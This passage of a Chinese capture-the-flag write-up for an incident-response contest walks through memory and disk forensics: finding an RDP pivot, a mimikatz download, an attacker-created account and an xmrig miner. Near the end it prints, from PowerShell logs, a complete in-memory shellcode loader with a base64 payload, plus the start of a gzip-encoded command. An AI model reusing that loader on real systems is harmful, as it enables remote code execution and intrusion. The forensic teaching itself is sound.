flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>既然是上传文件，那么data肯定是很大的，小的就不用看了，看flag下面那个，有可能就是。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103101771.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103109050.png" class="" title="图片引用方法一"><p>flag.pdf，再转变为ascii看仔细点</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103208759.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application/octet-stream</span><br></pre></td></tr></table></figure><p>那应该就是上传flag.pdf文件了！接下来我们需要导出它！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103655329.png" class="" title="图片引用方法一"><p>导出为pdf文件然后解压即可。</p><p>这里有点奇怪，不应该导出为gz然后解压出pdf嘛？但是我直接导出为pdf就行了。。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103829037.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dD7g_jk90_jnVm_aPkcs&#125;</span><br></pre></td></tr></table></figure><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">本题作为签到题,请给出邮服发件顺序。</span><br><span class="line"></span><br><span class="line">Received: from mail.da4s8gag.com ([140.143.207.229])</span><br><span class="line">by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD</span><br><span class="line">for ; Thu, 17 Oct 2024 11:24:01 +0800</span><br><span class="line">X-QQ-mid: xmmxszc6-1t1729135441tm9qrjq3k</span><br><span class="line">X-QQ-XMRINFO: NgToQqU5s31XQ+vYT/V7+uk=</span><br><span class="line">Authentication-Results: mx.qq.com; spf=none smtp.mailfrom=;</span><br><span class="line">dkim=none; dmarc=none(permerror) header.from=solar.sec</span><br><span class="line"></span><br><span class="line">Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1])</span><br><span class="line">by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264</span><br><span class="line">for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST)</span><br><span class="line">Date: Thu, 17 Oct 2024 11:24:01 +0800</span><br><span class="line">To: hellosolartest@qq.com</span><br><span class="line"></span><br><span class="line">From: 鍏嬪競缃戜俊</span><br><span class="line">Subject:xxxxxxxxxx</span><br><span class="line">Message-Id: &lt;20241017112401.032146@mail.solar.sec&gt;</span><br><span class="line">X-Mailer: QQMail 2.x</span><br><span class="line"></span><br><span class="line">XXXXXXXXXX</span><br><span class="line"></span><br><span class="line">flag格式为flag&#123;domain1|...|domainN&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mail.solar.sec|mail.da4s8gag.com|newxmmxszc6-1.qq.com&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-1"><a href="#内存取证-1" class="headerlink" title="内存取证-1"></a>内存取证-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到rdp连接的跳板地址</span><br><span class="line">flag格式 flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure><p>给了一个raw文件。</p><p>内存取证直接拿出我们的volatility</p><p>要查看跳板地址，那肯定要看端口使用情况，使用netscan</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110142358.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110211801.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110242420.png" class="" title="图片引用方法一"><p>其他都是0.0.0.0的，看中间这些就行了。</p><p>filefox.exe是火狐浏览器的进程，感觉也没必要看，看svchost.exe还有个System还有个spoolsv.exe就行，都试一下。</p><p>最后试出来就是这个，其实这里也不用试，rdp嘛也就是远程桌面协议，对应3389端口，看谁连接了我们本地的3389端口即可。那就只有下面这个啦！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110352142.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.60.220&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-2"><a href="#内存取证-2" class="headerlink" title="内存取证-2"></a>内存取证-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者下载黑客工具的IP地址</span><br><span class="line">flag格式 flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure><p>既然是下载黑客工具，那么netscan的连接肯定是可以看到的，但我们无法判断是哪个，只能一个一个试，这是一种方法。</p><p>还有一种方法，下载黑客工具，那么黑客肯定要执行命令，我们看cmdscan即可。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110908943.png" class="" title="图片引用方法一"><p>直接看到了mimikatz，那对应的ip地址就是155.94.204.67啦！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;155.94.204.67&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-3"><a href="#内存取证-3" class="headerlink" title="内存取证-3"></a>内存取证-3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">攻击者获取的“FusionManager节点操作系统帐户（业务帐户）”的密码是什么</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111119862.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111344755.png" class="" title="图片引用方法一"><p>看cmdline看到一个pass.txt，有可能就是。同时根据命令执行的顺序，pass.txt应该在桌面上</p><p>接下来我们用filescan查看文件</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111435871.png" class="" title="图片引用方法一"><p>使用 dumpfiles 插件导出</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111637244.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f H:\应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4cedd0 -D</span><br><span class="line"> ./</span><br></pre></td></tr></table></figure><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111723222.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;GalaxManager_2012&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-4"><a href="#内存取证-4" class="headerlink" title="内存取证-4"></a>内存取证-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者创建的用户</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>获取注册表中的用户即可，很简单。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111905095.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f H:\应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 printkey  -K  &quot;SAM\Domains\Account</span><br><span class="line">\Users\Names&quot;</span><br></pre></td></tr></table></figure><p>直接试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ASP.NET&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-5"><a href="#内存取证-5" class="headerlink" title="内存取证-5"></a>内存取证-5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者利用跳板rdp登录的时间</span><br><span class="line">flag格式 flag&#123;2024/01/01 00:00:00&#125;</span><br></pre></td></tr></table></figure><p><strong>方法一：</strong></p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229112051539.png" class="" title="图片引用方法一"><p>可以找到进程1908，但是这里没有时间。</p><p>那么接下来我们看看进程。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229112208817.png" class="" title="图片引用方法一"><p><strong>PID（Process ID）</strong></p><ul><li><strong>定义</strong>：PID 是操作系统分配给每个运行中进程的唯一标识符。每个进程在系统中都有一个唯一的 PID，用于标识进程。</li><li><strong>作用</strong>：PID 用于区分不同的进程，是系统内核跟踪和管理进程的重要方式。每当一个新的进程被创建时，操作系统会为其分配一个唯一的 PID。</li><li><strong>示例</strong>：如果你通过命令（如 <code>ps</code> 或 <code>top</code>）查看进程列表，你会看到每个进程对应的 PID。比如，PID 为 1234 的进程可能是一个正在运行的程序。</li></ul><p><strong>PPID（Parent Process ID）</strong></p><ul><li><strong>定义</strong>：PPID 是一个进程的父进程的 PID。换句话说，PPID 指的是启动当前进程的进程的标识符。每个进程（除了初始化进程）都有一个父进程。</li><li><strong>作用</strong>：PPID 显示了当前进程与其父进程的关系。操作系统使用 PPID 来管理进程之间的层级关系，当一个进程退出时，它的子进程可能会被重新分配给另一个父进程（通常是 <code>init</code> 进程）。</li><li><strong>示例</strong>：假设进程 PID 为 1234 的进程是由 PID 为 5678 的进程启动的，那么进程 1234 的 PPID 就是 5678。</li></ul><p>但是这里两个试了都不行</p><p>后来才知道</p><p><strong>UTC+0000</strong> 是一种表示时间偏移量的格式，用于说明某个时间与协调世界时（UTC，Universal Time Coordinated）的关系。</p><p><strong>UTC+0000</strong> 表示没有时间偏移的协调世界时，常用于不受时区影响的场合。</p><p>中国使用的时区是 <strong>中国标准时间（CST）</strong>，也被称为 <strong>北京时间</strong>。其时区偏移量是 <strong>UTC+08:00</strong>，也就是说，中国的时间比协调世界时（UTC）快 8 小时。</p><p>所以要加8小时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/21 00:15:34&#125;</span><br></pre></td></tr></table></figure><p><strong>方法二：</strong></p><p>我们在filescan文件中可以找到Windows日志文件Security.evtx，<strong>注意大写</strong></p><p><code>security.evtx</code> 是 Windows 操作系统中的一个事件日志文件，主要记录与系统安全相关的事件信息。它是 Windows 日志文件的一部分，用于存储关于用户登录、账户管理、安全审计、系统访问控制等事件的数据。</p><p>攻击者利用跳板rdp登录受害机，那么windows日志肯定会有相关记录。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113321749.png" class="" title="图片引用方法一"><p>我们把它dump下来</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113401080.png" class="" title="图片引用方法一"><p>dump下来后缀改成evtx就行，然后放到宝瓜分析！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113532493.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113556890.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/21 00:15:34&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-6"><a href="#内存取证-6" class="headerlink" title="内存取证-6"></a>内存取证-6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者创建的用户的密码哈希值</span><br><span class="line">flag格式 flag&#123;XXXX&#125;</span><br></pre></td></tr></table></figure><p>创建的用户是ASP.NET</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229122231066.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5ffe97489cbec1e08d0c6339ec39416d&#125;</span><br></pre></td></tr></table></figure><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>这里我们先获取虚拟机administrator用户的密码</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229132342981.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229132335459.png" class="" title="图片引用方法一"><h3 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库-1"></a>数据库-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请找到攻击者创建隐藏账户的时间</span><br><span class="line">flag格式 如 flag&#123;2024/01/01 00:00:00&#125;</span><br></pre></td></tr></table></figure><p>给了vmdk和ovf，可以用vmware打开和取证</p><p><strong>VMDK</strong> 是一种文件后缀，代表 <strong>Virtual Machine Disk</strong>，是一种虚拟磁盘文件格式。它由 VMware 开发，用于存储虚拟机的硬盘内容</p><p>先打开看看，发现需要密码，那么！取证大师！启动！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229130911566.png" class="" title="图片引用方法一"><p>在 Windows 中，账户名以 <strong><code>$</code></strong> 结尾的通常表示隐藏的共享或资源。</p><p>只有一个test$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;test$&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229131325621.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2024-12-16 15:24:21</span><br></pre></td></tr></table></figure><p>密码设置时间很有可能就是创建用户的时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/16 15:24:21&#125;</span><br></pre></td></tr></table></figure><p>不仅取证大师可以发现隐藏用户，这里也可以compmgmt.msc</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229132651247.png" class="" title="图片引用方法一"><h3 id="数据库-2"><a href="#数据库-2" class="headerlink" title="数据库-2"></a>数据库-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请找到恶意文件的名称</span><br><span class="line">flag格式 如 flag&#123;*.*&#125;</span><br></pre></td></tr></table></figure><p>上传火绒剑分析</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229133350472.png" class="" title="图片引用方法一"><p>发现c盘java目录下有一个xmrig.exe，有远程地址和本地地址的连接，猜测是恶意后门文件！</p><p>百度一下看看</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229133446413.png" class="" title="图片引用方法一"><p>塌房了！！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;xmrig.exe&#125;</span><br></pre></td></tr></table></figure><h3 id="数据库-3"><a href="#数据库-3" class="headerlink" title="数据库-3"></a>数据库-3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请找到恶意文件的外联地址</span><br><span class="line">flag格式 如 flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure><p>外链地址，简单，上面有了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">203.107.45.167:3333</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;203.107.45.167&#125;</span><br></pre></td></tr></table></figure><h3 id="数据库-4"><a href="#数据库-4" class="headerlink" title="数据库-4"></a>数据库-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请修复数据库</span><br><span class="line">flag格式 如 flag&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure><p>修复数据库？？？</p><h3 id="数据库-5"><a href="#数据库-5" class="headerlink" title="数据库-5"></a>数据库-5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请提交powershell命令中恶意文件的MD5</span><br><span class="line">flag格式 如 flag&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure><p>powershell命令，看日志</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229134458850.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229134531627.png" class="" title="图片引用方法一"><p>发现存在大量远程命令执行，我们逐个分析</p><p>在后面几个发现了比较特殊的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- EventData </span><br><span class="line"></span><br><span class="line">  MessageNumber 1 </span><br><span class="line">  MessageTotal 1 </span><br><span class="line">  ScriptBlockText function tWk &#123; Param ($k0M, $ybp) $f2w = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;) return $f2w.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($f2w.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($k0M)))), $ybp)) &#125; function lVhI5 &#123; Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $v8K8, [Parameter(Position = 1)] [Type] $nZWM = [Void] ) $p8dl = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate]) $p8dl.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $v8K8).SetImplementationFlags(&#x27;Runtime, Managed&#x27;) $p8dl.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $nZWM, $v8K8).SetImplementationFlags(&#x27;Runtime, Managed&#x27;) return $p8dl.CreateType() &#125; [Byte[]]$tUZml = [System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;) [Uint32]$uKrz = 0 $rS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll VirtualAlloc), (lVhI5 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $tUZml.Length,0x3000, 0x04) [System.Runtime.InteropServices.Marshal]::Copy($tUZml, 0, $rS, $tUZml.length) if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll VirtualProtect), (lVhI5 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($rS, [Uint32]$tUZml.Length, 0x10, [Ref]$uKrz)) -eq $true) &#123; $yfm6I = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll CreateThread), (lVhI5 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$rS,[IntPtr]::Zero,0,[IntPtr]::Zero) [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll WaitForSingleObject), (lVhI5 @([IntPtr], [Int32]))).Invoke($yfm6I,0xffffffff) | Out-Null &#125;  </span><br><span class="line">  ScriptBlockId 6272cc91-9ab4-4901-8088-ca946f7ae722 </span><br><span class="line">  Path  </span><br></pre></td></tr></table></figure><p>关注此处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- EventData </span><br><span class="line"></span><br><span class="line">  MessageNumber 1 </span><br><span class="line">  MessageTotal 1 </span><br><span class="line">  ScriptBlockText &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object 